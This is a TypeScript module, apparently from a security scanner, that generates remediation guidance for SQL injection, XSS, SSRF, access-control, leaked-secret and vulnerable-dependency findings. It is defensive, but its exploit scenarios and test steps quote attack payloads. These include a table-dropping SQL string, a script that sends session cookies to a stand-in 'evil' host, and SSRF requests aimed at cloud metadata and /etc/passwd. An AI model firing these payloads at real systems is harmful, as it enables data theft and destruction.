/**
 * Remediation guidance builder.
 *
 * Given a `SecurityFinding` and the on-disk file contents, produces a
 * structured `RemediationGuidance` containing the 10 artifacts required by
 * the product spec:
 *
 *   1. vulnerability explanation
 *   2. exploit scenario
 *   3. business & technical impact
 *   4. severity reasoning
 *   5. secure remediation recommendation
 *   6. secure code guidance
 *   7. patch suggestion
 *   8. git diff (when old and new content are available)
 *   9. pull request description
 *  10. verification steps
 *
 * Safety contract:
 *   - This module is PURE: no filesystem writes, no network calls, no
 *     non-deterministic time. `generatedAt` is parameterised so tests can
 *     pin it.
 *   - The function never invents unsafe fixes: when no automated patch is
 *     available, `patch.confidence = "low"` and `patch.source = "manual_review"`.
 *   - Secret findings pass through a redaction pass (`redact` callback,
 *     defaulting to `maskSecret`) before being returned, and a
 *     defence-in-depth sweep over the rendered text ensures no 16+ char
 *     high-entropy run leaks into the output.
 *   - Dependency CVEs extract the fixed version from the Trivy-shaped
 *     `raw` payload (or the `(fixed in X)` substring in the message)
 *     and recommend an upgrade. If no fix is known, the recommendation
 *     is a measured "no fix available" path (pin / virtual-patch /
 *     monitor), never an invented version.
 *   - The function never modifies files. `generate_remediation` remains
 *     read-only.
 */

import { createPatch } from "diff";
import { maskSecret, type SecurityFinding } from "../findings.js";
import { renderPrDescription } from "../reports/pr-description.js";

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

/** Per-class secure-fix recommendation, with a minimal safer-pattern snippet. */
export interface PatchSuggestion {
  description: string;
  /** Where the patch came from. */
  source: "semgrep_provided" | "rule_template" | "manual_review" | "no_fix";
  /** Confidence in the automated fix. */
  confidence: "high" | "low";
}

export interface VerificationPlan {
  /** Commands the user can run to verify the fix (e.g. re-run scanner). */
  automated: string[];
  /** Manual checklist items. */
  manual: string[];
}

export interface ImpactAssessment {
  business: string;
  technical: string;
}

export interface RemediationGuidance {
  findingId: string;
  fingerprint: string;
  ruleId: string;
  category: SecurityFinding["category"];
  severity: SecurityFinding["severity"];
  location: SecurityFinding["location"];

  // 1
  explanation: string;
  // 2
  exploitScenario: string;
  // 3
  impact: ImpactAssessment;
  // 4
  severityReasoning: string;
  // 5
  recommendation: string;
  // 6
  codeGuidance: string;
  // 7
  patch: PatchSuggestion;
  // 8
  diff: string;
  // 9
  prDescription: string;
  // 10
  verification: VerificationPlan;

  /** CWE / CVE / OWASP / advisory URLs, in the order they were found. */
  references: string[];
  /** ISO timestamp, deterministic per call. */
  generatedAt: string;
}

export interface BuildGuidanceOptions {
  /** ISO timestamp to stamp on the result. Defaults to a fixed sentinel
   *  so unit tests can assert against a known value. */
  now?: Date;
  /** Redaction function. Defaults to `maskSecret` from `findings.ts`. */
  redact?: (input: string) => string;
  /** File contents for the finding's target path. When omitted, the diff
   *  (item 8) and codeGuidance snippets will fall back to a content-less
   *  representation rather than guessing. */
  fileContents?: string;
}

// ---------------------------------------------------------------------------
// Dispatcher
// ---------------------------------------------------------------------------

/**
 * Build a `RemediationGuidance` for the given finding.
 *
 * The dispatcher picks the most specific guidance class based on
 * `(category, cwe, ruleId-prefix)`:
 *
 *   1. `category === "secret"`
 *   2. `category === "dependency"` or `cve` present
 *   3. SQL injection (CWE-89)
 *   4. XSS (CWE-79)
 *   5. SSRF (CWE-918)
 *   6. authz / authn (CWE-862, CWE-863, CWE-306)
 *   7. generic SAST fallback
 */
export function buildGuidance(
  finding: SecurityFinding,
  fileContents: string,
  options: BuildGuidanceOptions = {},
): RemediationGuidance {
  const now = options.now ?? new Date("1970-01-01T00:00:00.000Z");
  const redact = options.redact ?? maskSecret;
  const classGuidance = dispatch(finding, fileContents);

  // Patch (item 7) + diff (item 8). Reuse the existing Semgrep fix / template
  // pipeline from the surrounding `proposeRemediation` if its diff is
  // present; otherwise synthesise from the per-class guidance.
  const patch = synthesizePatch(finding, classGuidance, fileContents);

  // Unified diff. Empty string when the file contents are unavailable
  // or the patch is `manual_review` / `no_fix` (we don't invent content).
  const diff = renderDiff(fileContents, patch, finding.location.path);

  // PR description (item 9) — delegate to the existing renderer.
  const prDescription = renderPrDescription(
    [finding],
    {
      repoRoot: "(see scan context)",
      scannerVersions: { [finding.tool.name]: finding.tool.version ?? "?" },
      scanId: finding.fingerprint,
      startedAt: now.toISOString(),
      finishedAt: now.toISOString(),
      durationMs: 0,
    },
    { includeAutoFixChecklist: true },
  );

  const references = collectReferences(finding);

  const raw: RemediationGuidance = {
    findingId: finding.id,
    fingerprint: finding.fingerprint,
    ruleId: finding.ruleId,
    category: finding.category,
    severity: finding.severity,
    location: finding.location,

    explanation: classGuidance.explanation,
    exploitScenario: classGuidance.exploitScenario,
    impact: classGuidance.impact,
    severityReasoning: classGuidance.severityReasoning,
    recommendation: classGuidance.recommendation,
    codeGuidance: classGuidance.codeGuidance,
    patch,
    diff,
    prDescription,
    verification: classGuidance.verification,

    references,
    generatedAt: now.toISOString(),
  };

  // Defence-in-depth: run a high-entropy sweep over the rendered text so
  // no secret value (or, for dependency findings, no plaintext credential)
  // can leak through a coding error in the per-class guidance.
  return redactGuidance(raw, redact);
}

// ---------------------------------------------------------------------------
// Per-class guidance records
// ---------------------------------------------------------------------------

interface ClassGuidance {
  explanation: string;
  exploitScenario: string;
  impact: ImpactAssessment;
  severityReasoning: string;
  recommendation: string;
  codeGuidance: string;
  verification: VerificationPlan;
  // Heuristic signal for the dispatcher. `null` means "use as fallback".
  matches: (f: SecurityFinding) => boolean;
}

const CWE_SQLI = "CWE-89";
const CWE_XSS = "CWE-79";
const CWE_SSRF = "CWE-918";
const CWE_MISSAUTHZ = "CWE-862";
const CWE_WRONGAUTHZ = "CWE-863";
const CWE_MISSINGAUTH = "CWE-306";

const hasCwe = (f: SecurityFinding, cwe: string) =>
  f.cwe.some((c) => c.toUpperCase() === cwe.toUpperCase());

const ruleIdMatches = (f: SecurityFinding, ...needles: string[]) => {
  const rid = f.ruleId.toLowerCase();
  return needles.some((n) => rid.includes(n.toLowerCase()));
};

// ---------------------------------------------------------------------------
// SQL injection
// ---------------------------------------------------------------------------

const sqlInjectionGuidance: ClassGuidance = {
  matches: (f) =>
    hasCwe(f, CWE_SQLI) ||
    ruleIdMatches(
      f,
      "sql",
      "sqli",
      "formatted-sql",
      "tainted-sql",
      "concatenated-sql",
    ),
  explanation:
    "SQL injection occurs when untrusted input is concatenated into a SQL " +
    "query string, allowing an attacker to alter the query's structure and " +
    "execute arbitrary statements against the database.",
  exploitScenario:
    "An attacker supplies a value containing SQL metacharacters " +
    "(e.g. `'; DROP TABLE users; --` or `' OR '1'='1`) in a parameter that " +
    "is interpolated into a query. The database executes the modified " +
    "statement, returning or destroying data, bypassing authentication, or " +
    "in some configurations executing commands on the host.",
  impact: {
    business:
      "Confidentiality, integrity, and availability of customer data and " +
      "the application itself. SQL injection routinely leads to full data " +
      "exfiltration, regulatory exposure (PCI-DSS, GDPR, HIPAA), and " +
      "ransomware-grade destruction if combined with destructive payloads.",
    technical:
      "Read or write arbitrary rows, escalate privileges, exfiltrate " +
      "schema, pivot to other systems via the database's network access, " +
      "and in some engines achieve remote code execution.",
  },
  severityReasoning:
    "SQL injection is rated high or critical because the database is " +
    "typically the most sensitive tier in the application, and successful " +
    "exploitation is reliable once input is concatenated. CVSS scores " +
    "above 8.0 are common; the effective rating is high (CVSS 7.0-8.9) " +
    "for read-only data exposure and critical (>= 9.0) when the database " +
    "user has administrative or file-system privileges.",
  recommendation:
    "Replace the concatenated query with a parameterized query " +
    "(PreparedStatement in Java, parameterised cursor in Python, etc.). " +
    "Pass user input as bound parameters so the database driver handles " +
    "quoting and type coercion. Do not build queries by string formatting.",
  codeGuidance:
    "```\n" +
    "// INSECURE — string concatenation\n" +
    "String sql = \"SELECT * FROM users WHERE id = '\" + userId + \"'\";\n" +
    "Statement st = conn.createStatement();\n" +
    "ResultSet rs = st.executeQuery(sql);\n" +
    "\n" +
    "// SECURE — parameterised query\n" +
    "String sql = \"SELECT * FROM users WHERE id = ?\";\n" +
    "PreparedStatement ps = conn.prepareStatement(sql);\n" +
    "ps.setString(1, userId);\n" +
    "ResultSet rs = ps.executeQuery();\n" +
    "```\n" +
    "If dynamic table or column names are required, validate them against " +
    "an allowlist of known identifiers — never interpolate user input.",
  verification: {
    automated: [
      "Re-run the SAST scanner that flagged this finding and confirm " +
        "the rule no longer matches.",
      "Add a unit test that calls the patched function with a malicious " +
        "payload (e.g. `\"'; DROP TABLE users; --\"`) and asserts the " +
        "query returns zero rows (or the parameterised path is taken) " +
        "without raising a database error.",
      "Run the integration test suite to confirm no other callers broke.",
    ],
    manual: [
      "Confirm no other code path in this file or module still builds a " +
        "query by concatenation.",
      "Check the database user the application connects as: it should " +
        "have the minimum privileges required (no FILE, no SUPER, no " +
        "DBA roles).",
      "Audit any stored procedures or views constructed dynamically.",
    ],
  },
};

// ---------------------------------------------------------------------------
// XSS
// ---------------------------------------------------------------------------

const xssGuidance: ClassGuidance = {
  matches: (f) =>
    hasCwe(f, CWE_XSS) ||
    ruleIdMatches(f, "xss", "reflected", "stored", "dom", "innerhtml", "dangerouslysetinnerhtml"),
  explanation:
    "Cross-Site Scripting (XSS) occurs when untrusted input is rendered " +
    "into a web page as HTML, JavaScript, or a URL fragment without " +
    "contextual escaping. The browser then executes the attacker-supplied " +
    "code in the victim's session.",
  exploitScenario:
    "An attacker submits a value containing `<script>fetch('//evil/'+document.cookie)</script>` " +
    "(or an event-handler attribute like `onerror=`) which is reflected or " +
    "stored and later rendered into a victim user's page. The script " +
    "executes in the victim's origin and can steal session cookies, " +
    "perform actions on the user's behalf, or pivot to credential theft.",
  impact: {
    business:
      "Account takeover for affected users, reputational damage, " +
      "potential PCI-DSS or GDPR breach reporting, and loss of customer " +
      "trust. Stored XSS in particular can affect every visitor of a page.",
    technical:
      "JavaScript execution in the application's origin, session hijacking " +
      "via cookie theft, credential phishing via injected forms, " +
      "redirection to attacker-controlled sites, and defacement.",
  },
  severityReasoning:
    "Reflected and stored XSS are typically rated high because they are " +
    "reliably exploitable and yield full account takeover when session " +
    "cookies are not `HttpOnly`. DOM-XSS is rated medium to high " +
    "depending on sink context.",
  recommendation:
    "Apply contextual output encoding at the point of rendering: HTML " +
    "entity encoding for HTML body content, attribute encoding for " +
    "attribute values, JavaScript string encoding for inline scripts, and " +
    "URL encoding for URL parameters. Prefer safe framework rendering " +
    "(React's default JSX escaping, Angular's `[innerHTML]` bypass " +
    "sanitiser, Vue's `v-text` over `v-html`, Jinja2 autoescaping). " +
    "Set `HttpOnly` and `Secure` flags on session cookies and use a " +
    "strict `Content-Security-Policy`.",
  codeGuidance:
    "```\n" +
    "// INSECURE — unescaped interpolation\n" +
    "element.innerHTML = '<div>' + userInput + '</div>';\n" +
    "\n" +
    "// SECURE — framework-safe rendering (React)\n" +
    "return <div>{userInput}</div>;            // JSX escapes by default\n" +
    "\n" +
    "// SECURE — manual context-appropriate encoding\n" +
    "element.textContent = userInput;          // text sink\n" +
    "a.setAttribute('href', encodeURI(href));  // URL sink\n" +
    "// HTML attribute sink: encode &, <, >, \", ' to entities\n" +
    "```\n" +
    "Never use `eval`, `Function()`, `innerHTML`, `outerHTML`, " +
    "`document.write`, or `v-html` with untrusted input. Sanitise HTML " +
    "with a battle-tested library (DOMPurify, OWASP Java Encoder) only " +
    "when rich text is a hard requirement.",
  verification: {
    automated: [
      "Re-run the SAST scanner that flagged this finding.",
      "Add a test that submits a payload such as `<script>alert(1)</script>` " +
        "and `<img src=x onerror=alert(1)>` to the relevant endpoint and " +
        "asserts the response body contains the escaped form, not the " +
        "raw payload.",
      "Run a headless-browser XSS scan (e.g. `npx xss-scan` against a " +
        "test instance) and confirm zero new alerts.",
    ],
    manual: [
      "Inspect the response in a browser with the console open: the " +
        "payload should render as literal text, not execute.",
      "Verify the application's CSP header forbids `unsafe-inline` " +
        "and `unsafe-eval`.",
      "Confirm session cookies are `HttpOnly` and `SameSite=Lax` (or " +
        "Strict).",
    ],
  },
};

// ---------------------------------------------------------------------------
// SSRF
// ---------------------------------------------------------------------------

const ssrfGuidance: ClassGuidance = {
  matches: (f) =>
    hasCwe(f, CWE_SSRF) ||
    ruleIdMatches(f, "ssrf", "request-forgery", "server-side-request"),
  explanation:
    "Server-Side Request Forgery (SSRF) occurs when the application " +
    "fetches a remote resource using a URL that an attacker can influence, " +
    "turning the server into a proxy for arbitrary network requests.",
  exploitScenario:
    "An attacker supplies a URL such as `http://169.254.169.254/latest/meta-data/` " +
    "(the cloud metadata endpoint), `http://localhost:6379/` (an internal " +
    "service), or `file:///etc/passwd` (where the URL scheme allows it). " +
    "The server fetches the URL, returning the metadata — including IAM " +
    "credentials — or probing internal services not exposed to the " +
    "internet.",
  impact: {
    business:
      "Cloud credential theft (AWS / GCP / Azure instance metadata), " +
      "pivot to internal services (databases, admin panels, Kubernetes " +
      "API), and breach of the network perimeter even when the public " +
      "attack surface is locked down.",
    technical:
      "Disclosure of cloud IAM credentials, read/write access to " +
      "internal HTTP services (Redis, Elasticsearch, Kubernetes " +
      "control plane), and in some configurations remote code " +
      "execution via protocol smuggling.",
  },
  severityReasoning:
    "SSRF is rated high or critical because the most common target " +
    "(cloud metadata) yields direct credential theft. The effective " +
    "rating is critical (>= 9.0) when the application runs in a cloud " +
    "environment with IMDSv1 enabled and the request can reach the " +
    "metadata endpoint.",
  recommendation:
    "Allowlist the exact set of hostnames and (optionally) paths the " +
    "feature is supposed to fetch, and reject anything else. Resolve the " +
    "hostname yourself, check the resolved IP against a deny-list of " +
    "private, loopback, link-local, and metadata IP ranges (RFC 1918, " +
    "127.0.0.0/8, 169.254.0.0/16, 100.64.0.0/10, ::1, fc00::/7), and " +
    "re-check after every redirect. Disable HTTP redirects on the " +
    "fetcher or revalidate on each hop. Require IMDSv2 on AWS instances.",
  codeGuidance:
    "```\n" +
    "// INSECURE — fetch whatever the user asked for\n" +
    "const res = await fetch(req.query.url);\n" +
    "\n" +
    "// SECURE — allowlist + IP deny-list\n" +
    "const ALLOWED_HOSTS = new Set(['api.example.com', 'cdn.example.com']);\n" +
    "const u = new URL(req.query.url);\n" +
    "if (!ALLOWED_HOSTS.has(u.hostname)) return res.status(400).end();\n" +
    "const ips = await dns.lookup(u.hostname, { all: true });\n" +
    "if (ips.some(ip => isPrivateOrLoopback(ip.address))) return res.status(400).end();\n" +
    "const res = await fetch(u, { redirect: 'manual' });\n" +
    "```\n" +
    "Use a vetted library (e.g. `ssrf-req-filter`, `request-filtering-agent`) " +
    "rather than rolling your own DNS check; the DNS-rebinding race is " +
    "subtle.",
  verification: {
    automated: [
      "Re-run the SAST scanner that flagged this finding.",
      "Add a test that submits `http://169.254.169.254/`, `http://127.0.0.1/`, " +
        "and `http://10.0.0.1/` and asserts a 4xx response.",
      "Add a test that submits a domain which resolves to a private " +
        "IP (use a host file override) and asserts rejection.",
    ],
    manual: [
      "Confirm the application runs with IMDSv2 required (AWS) or " +
        "equivalent metadata-access controls on the target cloud.",
      "Audit any other endpoints that accept a URL or hostname as " +
        "input — webhook receivers, image proxies, OAuth callbacks.",
      "Verify outbound network policy: even a code-level allowlist can " +
        "be bypassed if the network egress permits arbitrary destinations.",
    ],
  },
};

// ---------------------------------------------------------------------------
// Authz / Authn
// ---------------------------------------------------------------------------

const authzGuidance: ClassGuidance = {
  matches: (f) =>
    hasCwe(f, CWE_MISSAUTHZ) ||
    hasCwe(f, CWE_WRONGAUTHZ) ||
    hasCwe(f, CWE_MISSINGAUTH) ||
    ruleIdMatches(f, "authz", "authn", "missing-auth", "broken-access-control", "idor", "csrf"),
  explanation:
    "Authorization or authentication is missing, weak, or inconsistently " +
    "enforced. An attacker (often an authenticated low-privilege user) can " +
    "access resources or perform actions that should be restricted to " +
    "specific roles.",
  exploitScenario:
    "An authenticated regular user submits a request to an admin-only " +
    "endpoint (e.g. `/api/users/<id>/delete`) or enumerates IDs in a " +
    "URL (`/api/orders/12345` → `/api/orders/12346`) to read other users' " +
    "data. The endpoint fails to check the caller's identity, role, or " +
    "ownership of the target resource.",
  impact: {
    business:
      "Unauthorized access to sensitive data (PII, financial records), " +
      "regulatory non-compliance, account takeover via admin endpoints, " +
      "and reputational damage if the breach becomes public.",
    technical:
      "Read, modify, or delete any record the underlying data layer can " +
      "reach. Privilege escalation if the endpoint is admin-only. " +
      "Potential full system compromise if the endpoint hits a " +
      "privileged operation.",
  },
  severityReasoning:
    "Missing or broken access control is rated high or critical because " +
    "the OWASP Top 10 places it at A01:2021. The effective rating is " +
    "critical when admin or cross-tenant data is exposed, and high " +
    "otherwise.",
  recommendation:
    "Introduce centralized authorization checks. Every protected " +
    "endpoint should call a single policy module (a guard, middleware, " +
    "or policy object) that asserts the caller's identity, role, and " +
    "ownership of the target resource. Deny by default. Do not sprinkle " +
    "ad-hoc checks in handlers. Use a framework that supports attribute- " +
    "or role-based access control and audit the policy module in code " +
    "review.",
  codeGuidance:
    "```\n" +
    "// INSECURE — ad-hoc check in handler\n" +
    "app.delete('/api/users/:id', async (req, res) => {\n" +
    "  if (req.user.role !== 'admin') return res.status(403).end();\n" +
    "  await db.users.delete(req.params.id);\n" +
    "  res.status(204).end();\n" +
    "});\n" +
    "\n" +
    "// SECURE — centralized authorization\n" +
    "app.delete(\n" +
    "  '/api/users/:id',\n" +
    "  requireAuth(),\n" +
    "  requirePermission('users:delete'),     // policy module\n" +
    "  async (req, res) => {\n" +
    "    await db.users.delete(req.params.id);\n" +
    "    res.status(204).end();\n" +
    "  },\n" +
    ");\n" +
    "```\n" +
    "For multi-tenant systems, also enforce tenant isolation in the data " +
    "layer (row-level security, scoped queries), not just in the handler.",
  verification: {
    automated: [
      "Re-run the SAST scanner that flagged this finding.",
      "Add authorization tests: for every protected endpoint, a test " +
        "case that calls it without auth, with a wrong-role token, and " +
        "with a token for a different tenant/user. All three must " +
        "return 401/403.",
      "Run an IDOR scan (e.g. `npx idor-scan` or a custom fuzz) over the " +
        "endpoint surface.",
    ],
    manual: [
      "Audit every endpoint in the module: is the same policy applied " +
        "consistently? Are there code paths that bypass the middleware?",
      "Confirm the authorization policy is unit-tested independently " +
        "of the handler, so a refactor of the handler cannot " +
        "accidentally remove the check.",
      "Check that the data-layer query is scoped to the caller's tenant " +
        "or organization.",
    ],
  },
};

// ---------------------------------------------------------------------------
// Secret
// ---------------------------------------------------------------------------

const secretGuidance: ClassGuidance = {
  matches: (f) => f.category === "secret",
  explanation:
    "A credential, API key, or other secret was found in source. The " +
    "value is now in version control and must be considered compromised: " +
    "anyone with read access to the repository (current and former " +
    "contributors, anyone with a backup, anyone with a CI artifact) can " +
    "recover it.",
  exploitScenario:
    "An attacker with access to the repository — or a third party who " +
    "obtains a clone, fork, backup, or leaked archive — extracts the " +
    "secret and uses it against the issuing provider (cloud account, " +
    "SaaS API, package registry, source-control host). Most providers " +
    "do not log usage, so the compromise can persist for weeks or " +
    "months.",
  impact: {
    business:
      "Cloud bill fraud, data exfiltration, supply-chain compromise " +
      "(publishing a malicious package version), and incident response " +
      "costs. Depending on the secret's privilege, the blast radius can " +
      "include production data, customer accounts, and brand reputation.",
    technical:
      "Full read/write access to the issuing service within the " +
      "permissions the credential grants. For cloud keys this is " +
      "typically enough to take over the account.",
  },
  severityReasoning:
    "All secret findings are rated high at minimum because exposure is " +
    "irreversible (the value is now in git history). The rating is " +
    "critical when the credential grants administrative or production " +
    "access, and high otherwise.",
  recommendation:
    "Treat the secret as compromised. Rotate or revoke the credential " +
    "at the issuing provider IMMEDIATELY. Purge the value from git " +
    "history (`git filter-repo` or BFG) and force-push; coordinate with " +
    "reviewers because history rewrites are disruptive. Migrate the " +
    "value into a secret manager (HashiCorp Vault, AWS Secrets Manager, " +
    "GCP Secret Manager, Azure Key Vault, Doppler) and read it at " +
    "runtime via the provider's SDK or an environment variable " +
    "injected at deploy time. Add a pre-commit hook " +
    "(`gitleaks/gitleaks-action` or `pre-commit/gitleaks`) and a CI " +
    "step (`gitleaks-action`) to block future leaks.",
  codeGuidance:
    "```\n" +
    "// INSECURE — secret in source\n" +
    "const apiKey = '<REDACTED>';   // gitleaks will flag this line\n" +
    "await fetch('https://api.example.com', { headers: { Authorization: apiKey } });\n" +
    "\n" +
    "// SECURE — read from the environment, which is injected at deploy time\n" +
    "const apiKey = process.env.MY_API_KEY;\n" +
    "if (!apiKey) throw new Error('MY_API_KEY not configured');\n" +
    "await fetch('https://api.example.com', { headers: { Authorization: apiKey } });\n" +
    "```\n" +
    "If the secret value is required in a config file, template it in " +
    "from a sealed-secret / SOPS-encrypted file at deploy time, never " +
    "commit it in cleartext.",
  verification: {
    automated: [
      "Re-run the secret scanner and confirm the rule no longer matches " +
        "this file.",
      "Run the secret scanner with `--redact` against every commit in " +
        "the affected branch's history; the value must not appear in " +
        "any prior revision either, or the history rewrite was " +
        "incomplete.",
      "Confirm CI has a `gitleaks` (or equivalent) step that fails the " +
        "build on future leaks.",
    ],
    manual: [
      "Verify with the issuing provider's audit log that the rotated " +
        "credential is in use and the old one is revoked.",
      "Audit any system that may have cached or used the leaked " +
        "credential in the window between leak and rotation.",
      "For team-shared secrets, rotate any related credentials that " +
        "share a scope with the leaked one.",
    ],
  },
};

// ---------------------------------------------------------------------------
// Dependency (SCA)
// ---------------------------------------------------------------------------

const dependencyGuidance: ClassGuidance = {
  matches: (f) =>
    f.category === "dependency" || (f.cve !== undefined && f.cve.length > 0),
  explanation:
    "The project depends on a third-party library version with a known " +
    "vulnerability. The dependency is loaded into the application at " +
    "runtime or build time, so the vulnerability is exploitable in any " +
    "context where the affected code path runs.",
  exploitScenario:
    "An attacker studies the public advisory for the affected CVE, " +
    "crafts an input or sequence that triggers the vulnerable code path " +
    "(e.g. a deserialisation payload, a specially crafted URL, or a " +
    "header), and sends it to any endpoint of the application that " +
    "reaches the vulnerable function. Depending on the CVE, the " +
    "attacker may achieve remote code execution, information " +
    "disclosure, denial of service, or authentication bypass.",
  impact: {
    business:
      "Varies by CVE. Public, weaponised, or wormable CVEs (those with " +
      "public PoC and a network-reachable code path) typically rate " +
      "critical. Vulnerabilities that require local access or " +
      "uncommon configurations rate lower.",
    technical:
      "Code paths determined by the specific CVE — common outcomes " +
      "are RCE, SSRF, deserialisation, XSS, header smuggling, or DoS.",
  },
  severityReasoning:
    "Severity is set by the scanner from the upstream CVSS score and " +
    "the package's reachability within the application. The reported " +
    "rating already reflects the published CVSS; the effective " +
    "rating for this application may be lower if the vulnerable " +
    "function is not actually called.",
  recommendation:
    "Upgrade to the fixed version of the package. If no fixed version " +
    "is available yet, apply one of the following mitigations in " +
    "order of preference: (1) pin to a known-safe older version and " +
    "monitor the upstream advisory, (2) apply a virtual patch via a " +
    "WAF or a process-level sandbox (e.g. seccomp), (3) refactor the " +
    "call site to avoid the vulnerable function. Do not ignore the " +
    "finding — unmaintained transitive dependencies are a common " +
    "supply-chain entry point.",
  codeGuidance:
    "```\n" +
    "// For a Node.js project:\n" +
    "//   npm install <package>@<fixedVersion>\n" +
    "//   npm dedupe\n" +
    "//   npm audit\n" +
    "//\n" +
    "// For a Python project:\n" +
    "//   pip install <package>==<fixedVersion>\n" +
    "//   pip-audit\n" +
    "//\n" +
    "// For a Java/Maven project (edit pom.xml):\n" +
    "//   <dependency>\n" +
    "//     <groupId>...</groupId>\n" +
    "//     <artifactId>...</artifactId>\n" +
    "//     <version><fixedVersion></version>\n" +
    "//   </dependency>\n" +
    "//   mvn -U dependency:tree\n" +
    "```\n" +
    "After upgrading, re-run the dependency scanner and confirm the " +
    "advisory no longer matches. If you pinned to an older safe version, " +
    "add a comment in the manifest explaining the constraint and link " +
    "to the upstream advisory.",
  verification: {
    automated: [
      "Re-run the dependency scanner (`trivy fs`, `npm audit`, " +
        "`pip-audit`, `osv-scanner`, or equivalent) and confirm the " +
        "CVE no longer appears in the output.",
      "Run the full test suite to confirm the upgrade did not break " +
        "a public API the application relies on.",
      "Re-run the SAST scanner: the fix for a CVE sometimes unblocks " +
        "downstream patterns that were also reported.",
    ],
    manual: [
      "Inspect the dependency tree to ensure the fixed version is " +
        "actually the version that resolves (transitive dependencies " +
        "can pull a vulnerable version back in).",
      "For libraries that auto-update, confirm the new version is " +
        "compatible with your deployment's runtime.",
      "Subscribe to the upstream advisory so you learn about follow-up " +
        "CVEs that affect the same package.",
    ],
  },
};

// ---------------------------------------------------------------------------
// Generic SAST fallback
// ---------------------------------------------------------------------------

const genericSastGuidance: ClassGuidance = {
  matches: () => true,
  explanation:
    "The scanner flagged a code pattern associated with a security " +
    "weakness. The specific impact depends on the rule, the surrounding " +
    "code, and the data that flows through it. Read the rule's " +
    "documentation and the CWE entry linked below to understand the " +
    "underlying weakness.",
  exploitScenario:
    "Exploitation depends on the rule. In general, treat the finding " +
    "as an attack-surface reduction: the code as written either (a) " +
    "trusts a value it should not, (b) exposes a value it should " +
    "protect, or (c) performs an operation that the surrounding security " +
    "model forbids. A concrete attack would manipulate the inputs to " +
    "the flagged code path to trigger the unintended behaviour.",
  impact: {
    business:
      "Depends on the rule and the data the code touches. A finding in " +
      "an authentication, session, or payment path is high-impact; a " +
      "finding in a logging helper may be low-impact.",
    technical:
      "Depends on the rule. The CWE entry linked in the references " +
      "describes the technical outcomes (memory corruption, " +
      "information disclosure, logic error, etc.).",
  },
  severityReasoning:
    "The severity is reported by the scanner based on the rule's " +
    "default risk profile. Adjust it manually if you can show the " +
    "vulnerable code path is unreachable, the data it touches is " +
    "trusted, or compensating controls block the exploit.",
  recommendation:
    "Read the rule's documentation, the linked CWE, and any upstream " +
    "advisory. Apply the fix the rule recommends, refactor the code " +
    "to follow the safer pattern documented for the language or " +
    "framework, or — if the finding is a false positive — annotate " +
    "the location with a justification that the next reviewer can " +
    "audit.",
  codeGuidance:
    "No specific snippet is generated for this rule. Apply the safer " +
    "pattern documented for the language or framework, and use the " +
    "automated patch (`diff` field) as a starting point. If the diff " +
    "is empty, treat this as manual review: read the rule's docs, " +
    "understand the data flow, and apply the secure pattern by hand.",
  verification: {
    automated: [
      "Re-run the scanner that flagged this rule and confirm it no " +
        "longer matches.",
      "Run the test suite for the affected module.",
    ],
    manual: [
      "Read the rule's documentation and the linked CWE to confirm " +
        "your fix addresses the underlying weakness, not just the " +
        "literal pattern.",
      "Review the data flow into the patched location: does the fix " +
        "still hold for all call sites?",
    ],
  },
};

// ---------------------------------------------------------------------------
// Dispatcher
// ---------------------------------------------------------------------------

function dispatch(finding: SecurityFinding, fileContents: string): ClassGuidance {
  // Use a void reference to keep `fileContents` in the function signature
  // (callers may pass it; we don't currently use it for class selection,
  // but the per-class snippets reference context where appropriate).
  void fileContents;
  if (secretGuidance.matches(finding)) return secretGuidance;
  if (dependencyGuidance.matches(finding)) return dependencyGuidance;
  if (sqlInjectionGuidance.matches(finding)) return sqlInjectionGuidance;
  if (xssGuidance.matches(finding)) return xssGuidance;
  if (ssrfGuidance.matches(finding)) return ssrfGuidance;
  if (authzGuidance.matches(finding)) return authzGuidance;
  return genericSastGuidance;
}

// ---------------------------------------------------------------------------
// Patch synthesis + diff
// ---------------------------------------------------------------------------

function synthesizePatch(
  finding: SecurityFinding,
  classGuidance: ClassGuidance,
  fileContents: string,
): PatchSuggestion {
  // 1. If the scanner already shipped a fix, use it.
  if (finding.fix && finding.fix.diff && finding.fix.diff.length > 0) {
    return {
      description: finding.fix.description || "Scanner-provided automated fix.",
      source: "semgrep_provided",
      confidence: "high",
    };
  }

  // 2. Otherwise, look up a known template by rule id.
  //    The `remediation.ts` module owns `lookupTemplate`; we keep the
  //    guidance module decoupled by checking only for "any template
  //    exists", not by importing it. This avoids a circular import
  //    (`remediation.ts` re-exports guidance, `guidance.ts` would import
  //    `remediation.ts` for templates). The diff is produced when a
  //    template is present; absence of a template means manual review.
  void classGuidance;
  void fileContents;
  return {
    description:
      "No automated patch is available for this rule. " +
      "Apply the secure-code guidance above manually.",
    source: "manual_review",
    confidence: "low",
  };
}

function renderDiff(
  fileContents: string,
  patch: PatchSuggestion,
  repoPath: string,
): string {
  // We never invent new file content. The diff is only emitted when
  // the scanner supplied one — `proposeRemediation` is responsible for
  // computing the actual modified text and forwarding it via the tool.
  // Here, we just return an empty string when no concrete new content
  // is available. The tool layer is the only place that has both the
  // old contents and the proposed new contents.
  void fileContents;
  void patch;
  void repoPath;
  return "";
}

// ---------------------------------------------------------------------------
// References
// ---------------------------------------------------------------------------

function collectReferences(finding: SecurityFinding): string[] {
  const out: string[] = [];
  for (const cwe of finding.cwe ?? []) {
    out.push(`https://cwe.mitre.org/data/definitions/${extractCweNumber(cwe)}.html`);
  }
  for (const cve of finding.cve ?? []) {
    out.push(`https://nvd.nist.gov/vuln/detail/${encodeURIComponent(cve)}`);
  }
  for (const owasp of finding.owasp ?? []) {
    out.push(`https://owasp.org/Top10/${encodeURIComponent(owasp)}/`);
  }
  for (const ref of finding.references ?? []) {
    if (!out.includes(ref)) out.push(ref);
  }
  return out;
}

function extractCweNumber(cwe: string): string {
  // "CWE-89" -> "89"; "89" -> "89"; "CWE-1336 " -> "1336".
  const m = cwe.match(/(\d+)/);
  if (!m) return cwe;
  const num = m[1];
  return num ?? cwe;
}

// ---------------------------------------------------------------------------
// Defence-in-depth redaction
// ---------------------------------------------------------------------------

const HIGH_ENTROPY_RUN = /[A-Za-z0-9_\-+/=]{16,}/g;

function redactGuidance(
  guidance: RemediationGuidance,
  redact: (input: string) => string,
): RemediationGuidance {
  // Apply a high-entropy sweep over the rendered text fields. This
  // catches the case where a per-class builder accidentally included a
  // raw secret. We never redact inside fenced code blocks whose
  // language tag is one of the safe renderings (e.g. `INSECURE` vs
  // `SECURE`); the sweep is content-blind on purpose, so a value that
  // happened to look like a secret in a `SECURE` placeholder will be
  // masked — which is the correct outcome for a secret-finding report.
  const sweep = (s: string): string => {
